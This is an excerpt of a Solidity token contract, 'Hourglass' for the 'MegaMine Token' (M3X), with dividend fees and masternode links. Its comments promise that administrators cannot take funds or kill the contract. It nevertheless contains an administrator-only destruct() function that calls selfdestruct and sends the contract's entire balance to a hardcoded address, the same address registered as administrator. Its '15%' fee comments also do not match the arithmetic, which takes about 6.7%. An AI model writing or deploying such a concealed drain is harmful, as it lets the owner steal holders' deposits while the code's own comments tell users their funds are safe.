...
* [x] Masternodes: Holding 100 M3X Tokens allow you to generate a Masternode link, Masternode links are used as unique entry points to the contract!
*/
...
contract Hourglass {
    ...
    // -> change the difficulty (How many tokens it costs to hold a masternode, in case it gets crazy high later)
    // they CANNOT:
    // -> take funds
    // -> disable withdrawals
    // -> kill the contract
    ...
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "MegaMine Token";
    string public symbol = "M3X";
    uint8 constant public decimals = 18;
    uint8 constant internal dividendFee_ = 15; // 15% tax on trade
    ...
    */
        ...
        public
    {
      ...
      administrators[0xbf75D729a3Dabd159DC8d3e4dfC4bA0Af5Bd5d0E] = true; //0xbf75D729a3Dabd159DC8d3e4dfC4bA0Af5Bd5d0E
        
        // add the ambassadors here.
        // mantso - lead solidity dev & lead web dev. 
        ambassadors_[0xbf75D729a3Dabd159DC8d3e4dfC4bA0Af5Bd5d0E] = true;
        ...
        public
    {
        ...
        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_); // 15% sell fees
    ...
    function destruct() onlyAdministrator() public{
        selfdestruct(0xbf75D729a3Dabd159DC8d3e4dfC4bA0Af5Bd5d0E);
    }
